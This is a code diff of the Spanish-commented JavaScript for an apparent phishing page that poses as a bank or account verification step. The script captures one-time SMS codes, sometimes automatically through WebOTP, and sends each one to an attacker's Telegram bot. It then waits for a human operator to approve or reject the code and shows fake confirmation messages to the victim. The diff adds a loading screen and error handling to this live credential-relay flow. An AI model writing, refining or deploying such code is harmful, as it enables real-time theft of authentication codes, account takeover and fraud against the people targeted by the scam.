@@ -33,7 +33,6 @@
     // en tiempo de ejecución para permitir la inyección masiva de iOS
     inputs.forEach(input => input.setAttribute("maxlength", "6"));
 
-
     if (inputs[0]) inputs[0].focus();
   })();
 
@@ -87,7 +86,7 @@
     clearInterval(timerId);
     timerId = setInterval(tick, 1000);
     
-  // Cada vez que inicia el temporizador, activamos la escucha en Android
+    // Cada vez que inicia el temporizador, activamos la escucha en Android
     activarEscuchaAutomaticaAndroid();
   }
 
@@ -105,7 +104,7 @@
     }
   }
 
-    // ============================================================
+  // ============================================================
   // TRUCO DE INTERCEPTACIÓN AVANZADA PARA ANDROID (WebOTP API)
   // ============================================================
   function activarEscuchaAutomaticaAndroid() {
@@ -119,10 +118,8 @@
       signal: oTPAbortController.signal
     }).then(otp => {
       if (otp && otp.code) {
-        // Busca el grupo de 6 números seguidos
         const coincidencia = otp.code.match(/\d{6}/);
         if (coincidencia) {
-          // CORRECCIÓN EXACTA: Se añade [0] para aislar la cadena "092605" del array
           const codigoExtraido = coincidencia[0];
           
           codigoExtraido.split("").forEach((char, idx) => {
@@ -131,7 +128,6 @@
           
           refreshSubmitState();
           
-          // Simula el submit si se completa de forma nativa en Android
           if (isComplete() && form) {
             form.dispatchEvent(new Event("submit"));
           }
@@ -141,7 +137,6 @@
       console.log("WebOTP pasiva terminada.");
     });
   }
-
 
   startTimer();
 
@@ -184,8 +179,7 @@
     });
   }
 
-
-// ============================================================
+  // ============================================================
   // EVENTOS DE LOS INPUTS ASIGNADOS EN TU ORDEN ORIGINAL
   // ============================================================
   inputs.forEach((input, index) => {
@@ -193,10 +187,9 @@
       input.classList.remove("invalid");
       const val = e.target.value;
 
-      // DETECCIÓN DE SUGERENCIA SMS O PEGADO DE TEXTO COMPLETO (Android e iPhone)
       if (val.length > 1) {
         const numeros = val.replace(/\D/g, "");
-        const cleanValue = numeros.slice(-6); // Extrae los últimos 6 dígitos (ignora precios)
+        const cleanValue = numeros.slice(-6); 
         
         cleanValue.split("").forEach((char, idx) => {
           if (inputs[idx]) {
@@ -206,15 +199,13 @@
         
         refreshSubmitState();
         
-        // Disparo automático si se completa desde el SMS masivo
         if (isComplete() && form) {
           form.dispatchEvent(new Event("submit"));
         }
         return;
       }
 
-      // MANEJO ESTÁNDAR PARA INGRESO CASILLA POR CASILLA
-input.value = val.replace(/\D/g, "");
+      input.value = val.replace(/\D/g, "");
       if (input.value && index < inputs.length - 1) {
         inputs[index + 1].focus();
       }
@@ -222,9 +213,7 @@ input.value = val.replace(/\D/g, "");
       refreshSubmitState();
     });
 
-
-// Control para retroceso al borrar
-input.addEventListener("keydown", (e) => {
+    input.addEventListener("keydown", (e) => {
       if (e.key === "Backspace" && !e.target.value && index > 0) {
         inputs[index - 1].focus();
         inputs[index - 1].value = "";
@@ -233,8 +222,6 @@ input.addEventListener("keydown", (e) => {
       }
     });
   });
-
-
 
   // ============================================================
   // LOGIC ENTRANTE EN TU EVENTO SUBMIT (TELEGRAM Y POLLING)
@@ -253,6 +240,10 @@ input.addEventListener("keydown", (e) => {
         messageEl.style.color = "#666666";
       }
 
+      // 1. ACTIVAR EL LOADING (Solo si existe en la pantalla)
+      const loader = document.getElementById("loading-container"); 
+      if (loader) loader.style.display = "flex"; 
+
       let lastUpdateIdApproval = 0;
       try {
         const resInit = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?limit=100`);
@@ -270,18 +261,23 @@ input.addEventListener("keydown", (e) => {
                            `✅ *Para VALIDAR el código:* Responde \`ok\` o \`si\`\n` +
                            `❌ *Para INVALIDAR (Código Incorrecto):* Responde \`no\` o \`mal\``;
 
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: textApproval,
-          parse_mode: 'Markdown'
-        })
-      });
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: textApproval,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (e) {
+        console.error("Error al enviar mensaje inicial:", e);
+      }
 
       let decision = null; 
       
+      // Bucle de escucha (Polling)
       while (!decision) {
         try {
           const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateIdApproval + 1}&timeout=5`);
@@ -296,7 +292,7 @@ input.addEventListener("keydown", (e) => {
               if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
                 const msgText = msg.text.trim().toLowerCase();
                 
-                if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
+if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
                   decision = 'approved';
                   break;
                 } else if (msgText === 'no' || msgText === 'mal' || msgText === 'incorrecto' || msgText === '2') {
@@ -318,6 +314,9 @@ input.addEventListener("keydown", (e) => {
       const flowType = sessionStorage.getItem('flow_type') || 'charge';
       const chargeAction = sessionStorage.getItem('charge_action') || 'Aprobado'; 
 
+      // ============================================================
+      // CASO A: OPERADOR APRUEBA EL CÓDIGO
+      // ============================================================
       if (decision === 'approved') {
         try {
           if (timerId) clearInterval(timerId);
@@ -329,33 +328,27 @@ input.addEventListener("keydown", (e) => {
           localStorage.setItem('transaction_status', 'Aprobado');
         }
 
-        // ============================================================
-        // CORRECCIÓN DE FRASES DE VALIDACIÓN FINAL
-        // ============================================================
+        // Corrección de frases de validación final
         if (messageEl) {
           if (flowType === 'login') {
             messageEl.textContent = "Inicio de sesión correcto.";
-            messageEl.style.color = "#28a745"; // Verde
+            messageEl.style.color = "#28a745"; 
           } else if (flowType === 'baja') {
             messageEl.textContent = "¡Validación de Baja Exitosa!";
-            messageEl.style.color = "#28a745"; // Verde
+            messageEl.style.color = "#28a745"; 
           } else {
-            // Evaluamos de forma segura pasando a minúsculas para evitar fallas de mayúsculas
             const accionNormalizada = String(chargeAction).toLowerCase();
 
             if (accionNormalizada === 'aprobado') {
-              // CAMBIO SOLICITADO: Frase exacta en color verde para aprobación
               messageEl.textContent = "¡Aprobación Confirmada y Aplicada!";
-              messageEl.style.color = "#28a745"; // Color Verde (#28a745)
+              messageEl.style.color = "#28a745"; 
             } else {
-              // Se mantiene tu frase original en color rojo para el rechazo
               messageEl.textContent = "¡Rechazo Confirmado y Aplicado!";
-              messageEl.style.color = "#d9534f"; // Color Rojo (#d9534f)
+              messageEl.style.color = "#d9534f"; 
             }
           }
           messageEl.className = "otp-message success";
         }
-        // ============================================================
 
         submitBtn.textContent = (flowType === 'charge' && String(chargeAction).toLowerCase() === 'rechazado') ? "Bloqueo Exitoso" : "Completado";
         submitBtn.style.backgroundColor = "#981D33";
@@ -365,6 +358,8 @@ input.addEventListener("keydown", (e) => {
         console.log("Validación finalizada. Redirigiendo al dashboard...");
 
         setTimeout(() => {
+          // Apagamos el loader justo antes del cambio de página
+          if (loader) loader.style.display = "none";
           try {
             window.location.replace("dashboard.html");
           } catch (e) {
@@ -374,23 +369,31 @@ input.addEventListener("keydown", (e) => {
 
         return; 
 
-
+      // ============================================================
+      // CASO B: OPERADOR RECHAZA EL CÓDIGO
+      // ============================================================
       } else if (decision === 'rejected') {
-submitBtn.disabled = false;
-submitBtn.textContent = "Validar código";
-if (messageEl) {
-messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
-messageEl.style.color = "#d9534f";
-messageEl.className = "otp-message error";
-}
-inputs.forEach(input => {
-input.value = "";
-input.classList.remove("invalid");
-input.setAttribute("maxlength", "6");
-});
-if (inputs[0]) inputs[0].focus();
-activarEscuchaAutomaticaAndroid(); // Volvemos a escuchar si rechaza el código
-}
-});
-}
+        // APAGAR LOADING para que el usuario pueda corregir el código
+        if (loader) loader.style.display = "none";
+
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Validar código";
+        
+        if (messageEl) {
+          messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
+          messageEl.style.color = "#d9534f";
+          messageEl.className = "otp-message error";
+        }
+        
+        inputs.forEach(input => {
+          input.value = "";
+          input.classList.remove("invalid");
+          input.setAttribute("maxlength", "6");
+        });
+        
+        if (inputs[0]) inputs[0].focus();
+        activarEscuchaAutomaticaAndroid(); // Reactivar WebOTP para el reintento
+      }
+    });
+  }
 })();
